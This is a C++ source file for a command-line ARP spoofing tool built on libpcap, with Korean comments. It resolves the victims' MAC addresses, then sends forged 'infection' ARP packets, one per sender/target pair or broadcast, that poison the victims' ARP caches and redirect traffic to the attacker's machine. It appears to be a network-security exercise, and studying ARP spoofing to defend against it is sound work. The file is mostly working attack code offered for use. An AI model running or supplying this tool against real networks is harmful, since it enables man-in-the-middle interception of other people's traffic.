#include <cstdio>

#include "ethhdr.h"
#include "arphdr.h"
#include "utill.h"

// include for MAC
#include <iostream>
#include <cstdlib>
#include <string>
#include <sys/ioctl.h>
#include <net/if.h>
#include <unistd.h>
#include <fstream>
#include <pcap.h>

#include <stdexcept>

#define MAC_ADDR_LEN 6

#pragma pack(push, 1)
struct DeviceAddress
{
        Mac mac;
        Ip ip;
};
#pragma pack(pop)

Ip myIp(char *interfaceName);
Mac getSMC(Ip sip, const std::string &interfaceName, Mac myMacAddress, Ip myIp);
EthArpPacket Make_packet(char *interfaceName, Mac my_mac, Ip sip, Ip tip, Ip my_ip);

Ip myIp(char *interfaceName)
{
        int sock = socket(AF_INET, SOCK_DGRAM, 0);
        if (sock < 0)
        {
                throw std::runtime_error("Socket error");
        }

        struct ifreq ifr;
        ifr.ifr_addr.sa_family = AF_INET;
        strncpy((char *)ifr.ifr_name, interfaceName, IFNAMSIZ - 1);

        if (ioctl(sock, SIOCGIFADDR, &ifr) < 0)
        {
                close(sock);
                throw std::runtime_error("ioctl error");
        }

        close(sock);

        uint32_t ip_address = ntohl((((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr).s_addr);

        return ip_address;
}

void usage()
{
        std::cout << "syntax: send-arp-test <interface>\n";
        std::cout << "sample: send-arp-test wlan0\n";
}

void SendInfectionPacket(pcap_t *handle, EthArpPacket packet)
{
        // EthArpPacket을 그냥 파라미터로 받아서 보내도록 하자..
        // ARP Spoofing 패킷 전송
        int res_sender = pcap_sendpacket(handle, reinterpret_cast<const u_char *>(&packet), sizeof(EthArpPacket));
        if (res_sender != 0)
        {
                fprintf(stderr, "pcap_sendpacket (Sender) return %d error=%s\n", res_sender, pcap_geterr(handle));
        }
}

int main(int argc, char *argv[])
{
        if (argc <= 2)
        {
                usage();
                return -1;
        }

        char *dev = argv[1]; // 네트워크 인터페이스 명
        char errbuf[PCAP_ERRBUF_SIZE];

        pcap_t *handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
        if (handle == nullptr)
        {
                fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
                return -1;
        }
        DeviceAddress attacker, sender, target;
        attacker.ip = myIp(dev);
        attacker.mac = Mac::getMyMac(dev);
        
        if (argc == 3)
        { // broadcat 모드
                target.ip = Ip(argv[2]);
                EthArpPacket broadcast_arp_packet = Broadcast_Infection(dev, attacker.mac, target.ip);
                SendInfectionPacket(handle, broadcast_arp_packet);
        }
        else
        { // 유니캐스트 모드
                if (argc % 2 != 0)
                {
                        usage();
                        return -1;
                }
                for (int i = 2; i < argc - 1; i += 2)
                {
                        
                        sender.ip = Ip(argv[i]);
                        EthArpPacket arp_packet = normal_packet(dev, attacker.mac, sender.ip, attacker.ip);
                        sender.mac = get_mac(handle, reinterpret_cast<const u_char *>(&arp_packet), sizeof(EthArpPacket));
                        // std::string sender_ip = argv[i];
                        std::string target_ip = argv[i + 1];

                        // target
                        target.ip = Ip(argv[i + 1]);
                        EthArpPacket arp_packet2 = normal_packet(dev, attacker.mac, target.ip, attacker.ip);
                        target.mac = get_mac(handle, reinterpret_cast<const u_char *>(&arp_packet2), sizeof(EthArpPacket));

                        EthArpPacket injection_packet = One_Infection(dev, attacker.mac, sender.mac, sender.ip, target.ip);
                        SendInfectionPacket(handle, injection_packet);
                }
        }

        pcap_close(handle);
        return 0;
}
